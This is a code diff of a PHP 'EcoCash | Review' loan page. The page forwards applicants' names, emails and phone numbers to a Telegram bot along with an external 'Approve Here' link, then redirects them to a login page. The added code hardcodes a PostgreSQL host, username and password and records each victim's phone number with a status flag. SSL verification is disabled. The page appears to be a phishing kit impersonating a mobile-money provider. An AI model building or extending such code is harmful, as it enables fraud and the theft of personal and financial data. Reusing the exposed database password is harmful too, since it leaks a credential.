@@ -5,16 +5,59 @@ ob_start();
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
+/* ========== POSTGRESQL CONFIGURATION ========== */
+$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
+$dbPort = 5432;
+$dbName = "loan_9d8q";
+$dbUser = "loan_9d8q_user";
+$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
+/* ============================================= */
+
+/**
+ * Get PostgreSQL connection
+ */
+function getDbConnection($host, $port, $dbname, $user, $pass) {
+    static $conn = null;
+    if ($conn === null) {
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
+        }
+        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("DB connection failed: " . pg_last_error());
+            return false;
+        }
+    }
+    return $conn;
+}
+
+$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+if (!$conn) {
+    // Non‑fatal – Telegram will still work, but log error
+    error_log("Could not connect to PostgreSQL for users table");
+}
+
+// Create `users` table if it doesn't exist
+if ($conn) {
+    $createTableSQL = "
+        CREATE TABLE IF NOT EXISTS users (
+            phone VARCHAR(20) PRIMARY KEY,
+            status INTEGER DEFAULT 0
+        )
+    ";
+    pg_query($conn, $createTableSQL);
+}
+
 /* -----------------------------
    SAVE STEP 2 DATA
 ------------------------------ */
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['first_name'])) {
-
     $_SESSION['first_name'] = $_POST['first_name'] ?? '';
     $_SESSION['last_name']  = $_POST['last_name'] ?? '';
     $_SESSION['email']      = $_POST['email'] ?? '';
     $_SESSION['phone']      = $_POST['phone'] ?? '';
-
     header("Location: step3.php");
     exit;
 }
@@ -27,7 +70,6 @@ if (!isset($_SESSION['loan_amount']) || !isset($_SESSION['first_name'])) {
     exit;
 }
 
-/* SAFE SESSION VARIABLES */
 $loan_type = $_SESSION['loan_type'] ?? 'N/A';
 $loan_term = $_SESSION['loan_term'] ?? 'N/A';
 $purpose   = $_SESSION['purpose'] ?? 'N/A';
@@ -62,8 +104,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
     $msg .= "Phone: +263 $phone\n";
 
     $msg .= "👤 *Approval area*\n";
-   $msg .= "Approve Here:https://loan-1-i36j.onrender.com/verify.php";
-   
+    $msg .= "Approve Here: https://loan-1-i36j.onrender.com/verify.php";
 
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
@@ -78,9 +119,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
     curl_setopt($ch, CURLOPT_POST, true);
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-    // SAFE SSL (no crash hosting issue)
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // safe for hosting
 
     $response = curl_exec($ch);
     $curlError = curl_error($ch);
@@ -95,8 +134,22 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
         $telegram_error = "HTTP Error: $httpCode";
     } elseif (isset($result['ok']) && $result['ok'] === true) {
 
-        $_SESSION['application_submitted'] = true;
+        // ========== INSERT PHONE INTO `users` TABLE ==========
+        if ($conn && !empty($phone)) {
+            // Insert phone with status 0 if not already exists
+            $insertSQL = "INSERT INTO users (phone, status) VALUES ($1, 0) ON CONFLICT (phone) DO NOTHING";
+            $insertResult = pg_query_params($conn, $insertSQL, [$phone]);
+            if (!$insertResult) {
+                error_log("Failed to insert phone $phone into users table: " . pg_last_error($conn));
+            } else {
+                error_log("User $phone inserted/ignored in users table with status 0");
+            }
+        } else {
+            error_log("Cannot insert phone: DB connection failed or phone empty");
+        }
+        // =====================================================
 
+        $_SESSION['application_submitted'] = true;
         header("Location: login.php");
         exit;
 
@@ -112,7 +165,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_application'])
 <meta charset="UTF-8">
 <title>EcoCash | Review</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
 <style>
 body { margin:0; font-family:Arial; background:#f2f2f2; }
 .header { background:#fff; padding:15px; display:flex; justify-content:space-between; }
@@ -126,7 +178,6 @@ body { margin:0; font-family:Arial; background:#f2f2f2; }
 .error { background:#ffdddd; padding:10px; margin-bottom:10px; }
 </style>
 </head>
-
 <body>
 
 <div class="header">
